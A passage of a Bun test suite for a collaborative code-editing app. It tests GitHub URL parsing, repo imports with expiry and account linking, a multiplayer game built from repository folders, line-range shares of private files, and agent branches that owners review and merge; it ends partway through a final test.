import { describe, expect, test } from "bun:test";
import { empty, merge, text, type Doc } from "../src/lines.ts";
import { run } from "../agents.ts";
import { GameRoom } from "../src/game-do.ts";
import { noodles } from "../src/noodles.ts";
import { isBuildFile } from "../src/buildfiles.ts";
import { accounts, local, post } from "./app-kit.ts";

describe("github", () => {
  test("a repo out of anything copied from GitHub", async () => {
    const { parseRepo } = await import("../src/github.ts");
    for (const s of ["honojs/hono", "https://github.com/honojs/hono", "github.com/honojs/hono/", "https://www.github.com/honojs/hono/tree/main/src",
      "https://github.com/honojs/hono/blob/main/src/index.ts#L10", "https://github.com/honojs/hono/pull/12", "git@github.com:honojs/hono.git",
      "ssh://git@github.com/honojs/hono.git", "git clone https://github.com/honojs/hono.git", "git clone --depth 1 git@github.com:honojs/hono.git my-dir",
      "gh repo clone honojs/hono", "https://raw.githubusercontent.com/honojs/hono/main/README.md", "https://github.com/honojs/hono?tab=readme"])
      expect([s, parseRepo(s)]).toEqual([s, "honojs/hono"]);
    for (const s of ["hono", "https://gitlab.com/a/b", "not a repo"]) expect(parseRepo(s)).toBeNull();
  });

  test("a folder out of a GitHub folder URL, split at the longest branch the repo has (#381)", async () => {
    const { parseFolder, branchAndPath } = await import("../src/github.ts");
    expect(parseFolder("https://github.com/QuinnsCode/RustyBuns/tree/main/apps/example/")).toBe("main/apps/example");
    expect(parseFolder("github.com/o/r/tree/feat%2Fx/a%20b?tab=x")).toBe("feat/x/a b");
    for (const s of ["o/r", "https://github.com/o/r", "https://github.com/o/r/blob/main/a.ts"]) expect(parseFolder(s)).toBeNull();
    const real = globalThis.fetch;
    globalThis.fetch = (async () => new Response(`0000${"a".repeat(40)} refs/heads/main\n${"b".repeat(40)} refs/heads/feat/x\n0000`)) as unknown as typeof fetch;
    try {
      expect(await branchAndPath("o/r", "feat/x/apps/example")).toEqual({ branch: "feat/x", path: "apps/example" });
      expect(await branchAndPath("o/r", "main/apps")).toEqual({ branch: "main", path: "apps" });
      expect(await branchAndPath("o/r", "main")).toEqual({ branch: "main", path: "" });
    } finally { globalThis.fetch = real; }
  });

  test("search GitHub; a visitor's dig expires in a day, and the oldest goes once too many are live", async () => {
    const call = await local({ GH_CLI: "off", ADMINS: "boss", DIG_CAP: "2" });
    const real = globalThis.fetch, searched: string[] = [];
    globalThis.fetch = (async (u: string) => {
      const url = new URL(u), m = /^\/repos\/([^/]+\/[^/]+)(\/commits\/main)?$/.exec(url.pathname);
      if (url.pathname === "/search/repositories") { searched.push(url.searchParams.get("q")!); return Response.json({ items: [{ full_name: "o/tiny", description: "d", stargazers_count: 5, language: "TS" }] }); }
      if (new URL(u).pathname.endsWith(".git/info/refs")) return new Response(`${"c".repeat(40)} HEAD\0side-band symref=HEAD:refs/heads/main\n`);
      if (m && m[2]) return Response.json({ sha: "c".repeat(40) });
      if (m) return Response.json({ full_name: m[1], private: false, default_branch: "main" });
      return new Response("{}", { status: 404 });
    }) as any;
    const deleted: string[] = [];
    call.artifacts.import = (async (params: any) => call.artifacts.create(params.target.name, { setDefaultBranch: "main" })) as any;
    const del = call.artifacts.delete.bind(call.artifacts);
    // Only the ones that removed a repo: a dig first clears any orphan under its name, usually none.
    call.artifacts.delete = (async (n: string) => { const gone = await del(n); if (gone) deleted.push(n); return gone; }) as any;
    try {
      for (const u of ["ana", "bo", "boss"]) await post(call, u, "/api/login", { name: u });
      expect(await (await call(null, "/api/github/search?q=tiny")).json()).toEqual({ repos: [{ repo: "o/tiny", description: "d", stars: 5, language: "TS" }] });
      expect(searched).toEqual(["tiny is:public"]);

      const one = (await (await post(call, "ana", "/api/github/dig", { repo: "o/one" })).json()) as any;
      expect(one.expires_at - Date.now()).toBeGreaterThan(23 * 3600_000);
      // Ana opens a file, so evicting it has a Durable Object to wipe.
      await post(call, "ana", "/api/repos/ana/one/files", { path: "a.ts", content: "x\n" });
      await post(call, "bo", "/api/github/dig", { repo: "o/two" });
      expect((await post(call, "boss", "/api/github/dig", { repo: "o/keep" })).status).toBe(201);   // an admin's keeps
      expect((await (await post(call, "boss", "/api/github/dig", { repo: "o/keep", name: "keep-2" })).json() as any).expires_at).toBeUndefined();

      // A third visitor's dig past the cap of two: ana's, the oldest, goes.
      expect((await post(call, "bo", "/api/github/dig", { repo: "o/three" })).status).toBe(201);
      expect(deleted).toEqual(["ana--one"]);
      expect((await call("ana", "/api/repos/ana/one")).status).toBe(404);
      expect(await call.env.DB.prepare("SELECT path FROM files WHERE owner = 'ana'").all()).toMatchObject({ results: [] });
      // And she can dig it up again, fresh.
      await post(call, "ana", "/api/github/dig", { repo: "o/one" });
      expect(((await (await call("ana", "/api/repos/ana/one/do/file?path=a.ts")).json()) as any).error).toBeDefined();

      // Past its day, a dig is gone at once, swept or not.
      await call.env.DB.prepare("UPDATE repos SET expires_at = ? WHERE owner = 'bo' AND name = 'three'").bind(Date.now() - 1).run();
      expect((await call("bo", "/api/repos/bo/three")).status).toBe(404);
      expect((await (await call("bo", "/api/users/bo")).json() as any).repos.map((r: any) => r.name)).toEqual([]);
      expect((await call("boss", "/api/repos/boss/keep")).status).toBe(200);
    } finally { globalThis.fetch = real; }
  });

  test("a signed-out GitHub wreck link digs one shared read-only copy and reuses it", async () => {
    const call = await local({ GH_CLI: "off" });
    const real = globalThis.fetch;
    globalThis.fetch = (async (u: string) => {
      if (new URL(u).pathname.endsWith(".git/info/refs")) return new Response(`${"c".repeat(40)} HEAD\0side-band symref=HEAD:refs/heads/main\n`);
      return new Response("{}", { status: 404 });
    }) as any;
    let imports = 0;
    call.artifacts.import = (async (params: any) => { imports++; return call.artifacts.create(params.target.name, { setDefaultBranch: "main" }); }) as any;
    try {
      const first = await post(call, null, "/api/github/wreck", { repo: "https://github.com/o/Tiny" });
      expect([first.status, await first.json()]).toEqual([200, { owner: "github", name: "o-tiny" }]);
      const again = await post(call, null, "/api/github/wreck", { repo: "o/tiny" });
      expect(await again.json()).toEqual({ owner: "github", name: "o-tiny" });
      expect(imports).toBe(1);
      expect((await call(null, "/api/game/r/github/o-tiny")).status).toBe(200);
      expect((await post(call, null, "/api/github/wreck", { repo: "nope" })).status).toBe(400);
    } finally { globalThis.fetch = real; }
  });

  test("a sign-in can link several GitHubs, encrypted at rest, and pick which one digs", async () => {
    const { call, person } = await accounts({ GITHUB_CLIENT_ID: "id", GITHUB_CLIENT_SECRET: "s" });
    const origin = "http://codesplitter.local", cookie = await person("ana@example.com", "ana-digger");
    const { symmetricEncrypt } = await import("better-auth/crypto");
    const authId = (await call.env.DB.prepare("SELECT auth_id FROM users WHERE name = 'ana-digger'").first())!.auth_id as string;
    const link = (id: string, token: string, at: string) => call.env.DB.prepare(`INSERT INTO account (id, accountId, providerId, userId, accessToken, createdAt, updatedAt) VALUES (?, ?, 'github', ?, ?, ?, ?)`)
      .bind(id, id + "-gh", authId, token, at, at).run();
    await link("personal", "tok-personal", "2026-01-01");   // linked before tokens were encrypted
    await link("work", await symmetricEncrypt({ key: "test-secret-".padEnd(40, "x"), data: "tok-work" }), "2026-02-01");
    const real = globalThis.fetch;
    globalThis.fetch = (async (u: string, init?: RequestInit) => {
      const token = new Headers(init?.headers).get("authorization")?.replace("Bearer ", "");
      const path = new URL(u).pathname;
      if (path === "/user") return Response.json({ login: { "tok-personal": "ana-gh", "tok-work": "ana-at-work" }[token!] });
      if (path === "/user/repos") return Response.json([{ full_name: `${token}/r`, private: false, default_branch: "main" }]);
      return new Response("{}", { status: 404 });
    }) as any;
    try {
      const repos = async () => (await (await call(null, "/api/github/repos", { headers: { cookie } })).json()) as any;
      // The one linked last digs until they pick.
      let g = await repos();
      expect([g.via, g.login, g.repos[0].repo]).toEqual(["account", "ana-at-work", "tok-work/r"]);
      expect(g.accounts).toEqual([{ id: "personal", active: false, agent: false, login: "ana-gh" }, { id: "work", active: true, agent: false, login: "ana-at-work" }]);
      const pick = (id: string) => call(null, "/api/github/active", { method: "POST", headers: { cookie }, body: JSON.stringify({ id }) });
      expect((await pick("personal")).status).toBe(200);
      g = await repos();
      expect([g.login, g.accounts.map((a: any) => a.active)]).toEqual(["ana-gh", [true, false]]);
      expect((await pick("someone-elses")).status).toBe(404);
      expect((await call(null, "/api/github/active", { method: "POST", body: JSON.stringify({ id: "personal" }) })).status).toBe(401);
      // Unlinking the picked one falls back to what's left.
      const un = await call(null, "/api/auth/unlink-account", { method: "POST", headers: { cookie, origin, "content-type": "application/json" }, body: JSON.stringify({ accountId: "personal" }) });
      expect(un.status).toBe(200);
      g = await repos();
      expect([g.login, g.accounts.map((a: any) => a.id)]).toEqual(["ana-at-work", ["work"]]);
    } finally { globalThis.fetch = real; }
  });

  test("dig up a GitHub repo: a fork you own, with where it came from", async () => {
    const call = await local({ GH_CLI: "off", GITHUB_TOKEN: "t0k" });
    // GitHub's API, faked; and the import, made local (a real one clones over the network).
    const real = globalThis.fetch, seen: string[] = [];
    globalThis.fetch = (async (u: string, init?: RequestInit) => {
      seen.push(`${u} ${new Headers(init?.headers).get("authorization")}`);
      const path = new URL(u).pathname;
      if (path === "/user") return Response.json({ login: "ana-gh" });
      if (path === "/user/repos") return Response.json([{ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" }, { full_name: "ana-gh/secret", private: true, default_branch: "main" }]);
      if (path === "/repos/ana-gh/Tiny.JS") return Response.json({ full_name: "ana-gh/Tiny.JS", private: false, default_branch: "trunk" });
      if (path === "/repos/ana-gh/secret") return Response.json({ full_name: "ana-gh/secret", private: true, default_branch: "main" });
      if (path === "/repos/ana-gh/Tiny.JS/commits/HEAD") return Response.json({ sha: "a".repeat(40) });
      if (path === "/repos/ana-gh/secret/commits/HEAD") return Response.json({ sha: "b".repeat(40) });
      return new Response("{}", { status: 404 });
    }) as any;
    const imports: any[] = [];
    call.artifacts.import = (async (params: any) => { imports.push(params); return call.artifacts.create(params.target.name, { setDefaultBranch: params.source.branch }); }) as any;
    try {
      await post(call, "ana", "/api/login", { name: "ana" });
      const list = await (await call("ana", "/api/github/repos")).json() as any;
      expect([list.via, list.login, list.privateOk, list.repos.map((r: any) => [r.repo, r.private])]).toEqual(["secret", "ana-gh", true, [["ana-gh/Tiny.JS", false], ["ana-gh/secret", true]]]);
      expect(seen[0]).toEndWith("Bearer t0k");

      expect((await post(call, null, "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(401);
      expect((await post(call, "ana", "/api/github/dig", { repo: "not a repo" })).status).toBe(400);
      const dug = await post(call, "ana", "/api/github/dig", { repo: "https://github.com/ana-gh/Tiny.JS.git" });
      expect(dug.status).toBe(201);
      expect(await dug.json()).toEqual({ owner: "ana", name: "tiny-js", upstream: "github:ana-gh/Tiny.JS", commit: "a".repeat(40) });
      expect(imports[0].source).toEqual({ url: "https://github.com/ana-gh/Tiny.JS.git", branch: "trunk", depth: 1 });
      expect(imports[0].target.opts.readOnly).toBeUndefined();   // writable: it's ana's now
      const meta = await (await call("ana", "/api/repos/ana/tiny-js")).json() as any;
      expect([meta.upstream, meta.branch, meta.home, meta.canWrite]).toEqual(["github:ana-gh/Tiny.JS", "trunk", "local", true]);
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/Tiny.JS" })).status).toBe(409);

      // Private: local git clones it with the token; the public import never sees one.
      expect(imports[0].source.token).toBeUndefined();
      expect((await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret" })).status).toBe(201);
      expect(imports[1].source).toEqual({ url: "https://github.com/ana-gh/secret.git", branch: "main", depth: 1, token: "t0k" });

      // A private repo the token can't see (invited as another login), from its page URL: this machine's git can, so it digs up,
      // and the clone goes through that git's own credentials, not the token. github.com points at a folder here, so no network.
      const { mkdtempSync } = await import("node:fs"), { tmpdir } = await import("node:os");
      const gh = mkdtempSync(`${tmpdir()}/gh-`), sh = (...a: string[]) => Bun.spawnSync(["git", ...a], { stderr: "ignore" });
      sh("init", "--quiet", "-b", "dev", `${gh}/w`);
      sh("-C", `${gh}/w`, "-c", "user.name=x", "-c", "user.email=x@x", "commit", "--quiet", "--allow-empty", "-m", "one");
      sh("clone", "--quiet", "--bare", `${gh}/w`, `${gh}/ana-gh/invited.git`);
      const was = { ...process.env };
      Object.assign(process.env, { GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: `url.file://${gh}/.insteadOf`, GIT_CONFIG_VALUE_0: "https://github.com/" });
      try {
        const inv = await post(call, "ana", "/api/github/dig", { repo: "https://github.com/ana-gh/invited/tree/dev" });
        expect(inv.status).toBe(201);
        expect(imports[2].source).toEqual({ url: "https://github.com/ana-gh/invited.git", branch: "dev", depth: 1 });
        const miss = await post(call, "ana", "/api/github/dig", { repo: "ana-gh/gone" });
        expect([miss.status, ((await miss.json()) as any).error]).toEqual([404, expect.stringContaining("gh auth login")]);
      } finally { for (const k of ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"]) if (was[k] === undefined) delete process.env[k]; else process.env[k] = was[k]; }
      // Cloudflare Artifacts imports public repos only: say so instead of failing later.
      Object.defineProperty(call.artifacts, "privateImports", { value: false });
      expect((await (await call("ana", "/api/github/repos")).json() as any).privateOk).toBe(false);
      const edge = await post(call, "ana", "/api/github/dig", { repo: "ana-gh/secret", name: "secret-2" });
      expect([edge.status, ((await edge.json()) as any).error]).toEqual([422, expect.stringContaining("desktop app")]);
    } finally { globalThis.fetch = real; }
  });
});

describe("game", () => {
  test("a level's backrooms: folders are doors, files are walls, cached by commit", async () => {
    const call = await local();
    const ns = call.artifacts, { push } = await import("../src/git.ts");
    const made = await ns.create("level-mitt");
    await push(made.remote, made.token, { changes: { "README.md": "mitt\n\ttabbed\n", "src/index.ts": "export default 1\nexport function isRecord(x: unknown): x is Record<string, unknown> {\n\treturn typeof x === \"object\" && x !== null;\n}\n", "logo.png": "\u0000png" }, message: "upstream", author: "upstream" });
    const tip = (await (await ns.get("level-mitt")).log())[0]!.hash;
    await call.env.DB.prepare("INSERT INTO levels (slug, status, commit_hash) VALUES ('mitt', 'ready', ?)").bind(tip).run();

    const root = await (await call(null, "/api/game/l/mitt/walls")).json() as any;
    expect(root.doors).toEqual([{ name: "src", path: "src" }]);
    expect(root.files.map((f: any) => [f.name, f.lines])).toEqual([["logo.png", []], ["README.md", ["mitt", "  tabbed", ""]]]);
    const src = (await (await call(null, "/api/game/l/mitt/walls?path=src")).json() as any).files[0];
    expect(src.lines[0]).toBe("export default 1");
    // Its type guard is a noodle monster, sent with its line range.
    expect(src.noodles).toEqual([{ name: "isRecord", start: 2, end: 4, record: true, lines: ["export function isRecord(x: unknown): x is Record<string, unknown> {", "  return typeof x === \"object\" && x !== null;", "}"] }]);
    expect(root.files.every((f: any) => !f.noodles)).toBe(true);
    expect((await call(null, "/api/game/l/mitt/walls?path=nope")).status).toBe(404);
    expect((await call(null, "/api/game/l/clsx/walls")).status).toBe(409);       // not imported
    // A second visit reads D1, not Artifacts.
    expect((await call.env.DB.prepare("SELECT key FROM walls_cache ORDER BY key").all()).results.map((r: any) => r.key)).toEqual([`v2:${tip}:`, `v2:${tip}:src`]);
    // Private repos stay private in the game too.
    await post(call, "ana", "/api/repos", { name: "secret", visibility: "private" });
    expect((await call("bo", "/api/game/r/ana/secret")).status).toBe(404);
    expect((await call("ana", "/api/game/r/ana/secret")).status).toBe(200);
  });

  test("noodles: type guards, isRecord the biggest, with their line ranges", () => {
    const found = noodles([
      "import x from \"y\";",
      "export function isRecord(value: unknown): value is Record<string, unknown> {",
      "  if (typeof value !== \"object\") return false;",
      "  return value !== null;",
      "}",
      "const isFoo = (x: unknown): x is { a: string } =>",
      "  typeof x === \"object\" &&",
      "  x !== null;",
      "export const isBar = <T extends Record<string, unknown>>(x: T | null): x is T => x != null;",
      "function notAGuard(x: unknown): boolean { return true }",
      "function isObj(x: unknown): x is Foo | { b: 1 } {",
      "  return true;",
      "}",
    ].join("\n"));
    expect(found.map((n) => [n.name, n.start, n.end, n.record])).toEqual([["isRecord", 2, 5, true], ["isFoo", 6, 8, false], ["isBar", 9, 9, false], ["isObj", 11, 13, false]]);
    expect(found[1]!.lines).toEqual(["const isFoo = (x: unknown): x is { a: string } =>", "  typeof x === \"object\" &&", "  x !== null;"]);
  });

  test("noodles: a guard of Record<string, unknown | undefined> is the big one whatever its name", () => {
    const found = noodles([
      "const isBag = (x: unknown): x is Record<string, undefined> => typeof x === \"object\";",
      "const isMap = (x: unknown): x is Record<string, string> => typeof x === \"object\";",
    ].join("\n"));
    expect(found.map((n) => [n.name, n.record])).toEqual([["isBag", true], ["isMap", false]]);
  });

  test("the room on a level's page: lobby, start, relay, clubbing, round over", async () => {
    const call = await local();
    const join = async (user: string) => {
      const res = await call(user, "/api/game/l/mitt/ws", { headers: { upgrade: "websocket" } }) as any;
      expect(res.status).toBe(101);
      const ws = res.webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    const ana = await join("ana"), bo = await join("bo");
    await Bun.sleep(5);
    expect(ana.last("lobby").players.map((p: any) => p.user)).toEqual(["ana", "bo"]);
    expect(await (await call(null, "/api/game/l/mitt")).json()).toEqual({ state: "waiting", players: ["ana", "bo"] });

    // Both ready: the round starts for both with one seed.
    await ana.say({ t: "ready" });
    expect(ana.last("start")).toBeUndefined();
    await bo.say({ t: "ready" });
    expect(ana.last("start").seed).toBe(bo.last("start").seed);

    const boId = bo.last("lobby").you;
    await ana.say({ t: "pos", p: [1, 0, 2], yaw: 0.5, room: "src", swing: true });
    expect(bo.last("pos")).toMatchObject({ user: "ana", p: [1, 0, 2], room: "src", swing: true });
    expect(ana.last("pos")).toBeUndefined();                                   // not echoed back
    await ana.say({ t: "hit", target: boId, dir: [1, 0] });
    expect(bo.last("bopped")).toEqual({ t: "bopped", by: "ana", dir: [1, 0] });

    await ana.say({ t: "dead", score: 700 });
    expect(ana.last("over")).toBeUndefined();                                  // bo is still up
    await bo.say({ t: "dead", score: 300 });
    expect(ana.last("over").players.map((p: any) => [p.user, p.score])).toEqual([["ana", 700], ["bo", 300]]);
    expect(ana.last("lobby").state).toBe("waiting");

    // Next round: ana goes out, bo's tab goes quiet. Start says why it can't, until bo counts as idle.
    await ana.say({ t: "start" });
    const seed = ana.last("start").seed;
    await ana.say({ t: "dead", score: 50 });
    await ana.say({ t: "start" });
    expect(ana.last("note").text).toContain("bo");
    expect(ana.last("start").seed).toBe(seed);
    const idle = GameRoom.IDLE_MS;
    GameRoom.IDLE_MS = -1;
    try { await ana.say({ t: "start" }); } finally { GameRoom.IDLE_MS = idle; }
    expect(ana.last("start").seed).not.toBe(seed);
    expect(bo.last("start").seed).toBe(ana.last("start").seed);
  });

  test("panic rooms: pick a mode, break pieces for everyone, walk in on the wreckage", async () => {
    const call = await local();
    const join = async (user: string) => {
      const ws = ((await call(user, "/api/game/r/ana/dig/ws", { headers: { upgrade: "websocket" } })) as any).webSocket, got: any[] = [];
      ws.toBrowser = (d: string) => got.push(JSON.parse(d));
      for (const d of ws.queue.splice(0)) got.push(JSON.parse(d));
      const say = async (m: unknown) => { ws.onMessage(JSON.stringify(m)); await Bun.sleep(5); };
      return { got, say, last: (t: string) => got.filter((m) => m.t === t).at(-1) };
    };
    await post(call, "ana", "/api/repos", { name: "dig" });
    const ana = await join("ana"), bo = await join("bo");
    expect(ana.last("lobby").mode).toBe("horde");

    // Removed needs a diff; with one, everyone sees it.
    await ana.say({ t: "mode", mode: "removed" });
    expect(ana.last("note").text).toContain("diff");
    await ana.say({ t: "mode", mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    expect(bo.last("lobby")).toMatchObject({ mode: "removed", diff: { path: "a.ts", from: 2, to: 5 } });
    await bo.say({ t: "mode", mode: "wreck" });
    await bo.say({ t: "start" });
    expect(ana.last("start")).toMatchObject({ mode: "wreck" });
    await ana.say({ t: "mode", mode: "horde" });
    expect(ana.last("note").text).toContain("between rounds");

    // A break goes to the others once, and stays broken for the round.
    await ana.say({ t: "break", id: "src|0|1" });
    await ana.say({ t: "break", id: "src|0|1" });
    expect(bo.got.filter((m) => m.t === "broke")).toEqual([{ t: "broke", id: "src|0|1", by: "ana" }]);
    expect(ana.last("broke")).toBeUndefined();
    const cy = await join("cy");
    expect(cy.last("lobby")).toMatchObject({ state: "playing", mode: "wreck", broken: ["src|0|1"] });

    // Next round starts clean, in the mode picked.
    for (const p of [ana, bo, cy]) await p.say({ t: "dead", score: 10 });
    expect(ana.last("lobby")).toMatchObject({ state: "waiting", mode: "wreck" });
    await ana.say({ t: "start" });
    const late = await join("di");
    expect(late.last("lobby").broken).toEqual([]);
  });
});

describe("shares", () => {
  test("share a few lines of a private repo: live, following the lines, nothing else leaks", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "vault", visibility: "private" });
    await post(call, "ana", "/api/repos/ana/vault/files", { path: "a.ts", content: "one\ntwo\nthree\nfour" });
    const made = await post(call, "ana", "/api/repos/ana/vault/shares", { path: "a.ts", from: 2, to: 3, note: "the good bit" });
    expect(made.status).toBe(201);
    const { id } = await made.json() as any;
    const look = async (who: string | null) => (await (await call(who, `/api/shares/${id}`)).json()) as any;
    expect((await look(null)).lines.map((l: any) => [l.n, l.text])).toEqual([[2, "two"], [3, "three"]]);
    expect((await call("bo", "/api/repos/ana/vault/do/file?path=a.ts")).status).toBe(404);     // the rest stays sealed
    expect((await post(call, "bo", "/api/repos/ana/vault/shares", { path: "a.ts", from: 1, to: 4 })).status).toBe(404);

    // Edits around and inside the range: it follows the lines.
    const doc = await (await call("ana", "/api/repos/ana/vault/do/file?path=a.ts")).json() as any;
    const two = doc.lines[1];
    await post(call, "ana", "/api/repos/ana/vault/do/ops?path=a.ts", { ops: [{ kind: "insert", after: null, text: "zero" }, { kind: "insert", after: two.id, text: "two and a half" }, { kind: "set", line: two.id, base: two.rev, text: "TWO" }] });
    expect((await look("bo")).lines.map((l: any) => [l.n, l.text])).toEqual([[3, "TWO"], [4, "two and a half"], [5, "three"]]);

    expect((await call("bo", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(403);
    expect((await call("ana", `/api/shares/${id}`, { method: "DELETE" })).status).toBe(200);
    expect((await call(null, `/api/shares/${id}`)).status).toBe(404);
  });

  test("an agent works on a branch, and the owner reviews and merges it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "one\ntwo\nthree" });
    expect((await post(call, "bo", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(403);
    expect((await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "tidy" })).status).toBe(201);
    const on = "/api/repos/ana/r/do", q = "?path=a.js&branch=tidy";
    const ops = (user: string, query: string, o: unknown[]) => post(call, user, `${on}/ops${query}`, { ops: o });

    // The branch's copy starts as main's, ids and revs included.
    expect((await (await call("agent-a", `${on}/file${q}`)).json() as Doc).lines.map((l) => l.id)).toEqual(["L1", "L2", "L3"]);
    expect((await ops("agent-a", q, [{ kind: "set", line: "L2", base: 2, text: "TWO" }, { kind: "insert", after: "L3", text: "four" }])).status).toBe(200);
    expect((await post(call, "agent-a", "/api/repos/ana/r/files", { path: "new.js", content: "fresh", branch: "tidy" })).status).toBe(201);
    // Main moves on meanwhile, on another line and on the same one.
    await ops("ana", "?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "ONE" }, { kind: "set", line: "L3", base: 3, text: "3" }]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("ONE\ntwo\n3");

    expect((await post(call, "ana", "/api/repos/ana/r/do/merge?path=a.js", {})).status).toBe(404);
    expect((await post(call, "ana", `${on}/commit${q}`, {})).status).toBe(400);
    const review = await (await call("ana", "/api/repos/ana/r/branches/tidy")).json() as any;
    expect(review.files.map((f: any) => [f.path, f.ops.length, f.conflicts.length])).toEqual([["a.js", 2, 0], ["new.js", 1, 0]]);
    expect((await post(call, "ana", "/api/repos/ana/r/branches/tidy/merge", {})).status).toBe(200);
    const main = await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc;
    expect(main.lines.map((l) => `${l.by}:${l.text}`)).toEqual(["ana:ONE", "agent-a:TWO", "ana:3", "agent-a:four"]);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=new.js")).json() as Doc)).toBe("fresh");
    expect((await (await call("ana", "/api/repos/ana/r/branches")).json() as any[])[0]).toMatchObject({ name: "tidy", status: "merged", merged_by: "ana" });
    // A merged branch takes no more edits.
    expect((await ops("agent-a", q, [{ kind: "insert", after: null, text: "late" }])).status).toBe(404);
  });

  test("a branch takes any name git would, and says which character it can't (#701)", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "x/a.js", content: "main" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "main" });
    const start = async (name: string) => { const r = await post(call, "ana", "/api/repos/ana/r/branches", { name }); return [r.status, (await r.json() as any).error]; };
    for (const name of ["feature/login", "Fix-Login", "v1.2", "codesplitter/city-presence-576", "feat", "under_score"]) expect(await start(name)).toEqual([201, undefined]);
    expect(await start("cs checks test")).toEqual([400, "bad branch name: no spaces in a branch name: use - instead"]);
    expect(await start("a..b")).toEqual([400, `bad branch name: a branch name can't have ".." in it`]);
    expect(await start("what?")).toEqual([400, `bad branch name: a branch name can't have "?" in it`]);
    expect(await start("main")).toEqual([400, "bad branch name: main is the branch everything merges into"]);
    expect(await start("x".repeat(256))).toEqual([400, "bad branch name: a branch name is at most 255 bytes"]);

    // feat/x's a.js and feat's x/a.js are two copies, not one.
    const at = (path: string, b: string) => `/api/repos/ana/r/do/ops?path=${encodeURIComponent(path)}&branch=${encodeURIComponent(b)}`;
    const file = async (path: string, b: string) => text(await (await call("ana", `/api/repos/ana/r/do/file?path=${encodeURIComponent(path)}&branch=${encodeURIComponent(b)}`)).json() as Doc);
    expect(await start("feat/x")).toEqual([201, undefined]);
    expect((await post(call, "ana", at("a.js", "feat/x"), { ops: [{ kind: "set", line: "L1", base: 1, text: "feat/x" }] })).status).toBe(200);
    expect(await file("x/a.js", "feat")).toBe("main");
    expect(await file("a.js", "feat/x")).toBe("feat/x");
    const review = await (await call("ana", `/api/repos/ana/r/branches/${encodeURIComponent("feat/x")}`)).json() as any;
    expect(review).toMatchObject({ name: "feat/x", files: [{ path: "a.js" }] });
    expect((await post(call, "ana", `/api/repos/ana/r/branches/${encodeURIComponent("feat/x")}/merge`, {})).status).toBe(200);
    expect(await (async () => text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc))()).toBe("feat/x");
  });

  test("a branch deletes a file, and merging deletes it from main and its git (#440)", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    for (const path of ["a.js", "b.js"]) {
      await post(call, "ana", "/api/repos/ana/r/files", { path, content: `// ${path}` });
      expect((await post(call, "ana", `/api/repos/ana/r/do/commit?path=${path}`, { message: path })).status).toBe(200);
    }
    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "prune" });
    const del = (user: string, path: string) => call(user, `/api/repos/ana/r/branches/prune/files?path=${path}`, { method: "DELETE" });
    expect((await del("bo", "a.js")).status).toBe(403);
    expect((await del("agent-a", "nope.js")).status).toBe(404);
    // One main has, and one that's only on the branch (that one just goes).
    expect((await del("agent-a", "a.js")).status).toBe(200);
    expect((await del("agent-a", "a.js")).status).toBe(404);
    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "tmp.js", content: "x", branch: "prune" });
    expect((await del("agent-a", "tmp.js")).status).toBe(200);
    // Gone on the branch, still on main.
    expect((await call("agent-a", "/api/repos/ana/r/do/file?path=a.js&branch=prune")).status).toBe(404);
    expect((await call("agent-a", "/api/repos/ana/r/do/file?path=a.js")).status).toBe(200);
    // Made again and deleted again on the branch: still a deletion.
    expect((await post(call, "agent-a", "/api/repos/ana/r/files", { path: "a.js", content: "back", branch: "prune" })).status).toBe(201);
    expect(text(await (await call("agent-a", "/api/repos/ana/r/do/file?path=a.js&branch=prune")).json() as Doc)).toBe("back");
    expect((await del("agent-a", "a.js")).status).toBe(200);

    const review = await (await call("ana", "/api/repos/ana/r/branches/prune")).json() as any;
    expect(review.files).toEqual([{ path: "a.js", merged: false, build: false, deleted: true, ops: [], conflicts: [] }]);
    const merged = await post(call, "ana", "/api/repos/ana/r/branches/prune/merge", {});
    expect(await merged.json()).toMatchObject({ status: "merged", merged: [{ path: "a.js", deleted: true }] });
    // Main has no a.js, and its git doesn't either (or reading it would dig it up again).
    expect((await call("ana", "/api/repos/ana/r/do/file?path=a.js")).status).toBe(404);
    expect((await (await call("ana", "/api/repos/ana/r/tree?path=")).json() as any).entries.map((e: any) => e.path)).toEqual(["b.js"]);
  });

  test("on a branch, the tree is the branch's, and a reviewer rejects one hunk of it (#735)", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    for (const path of ["a.js", "src/b.js"]) await post(call, "ana", "/api/repos/ana/r/files", { path, content: "one\ntwo\nthree\nfour" });
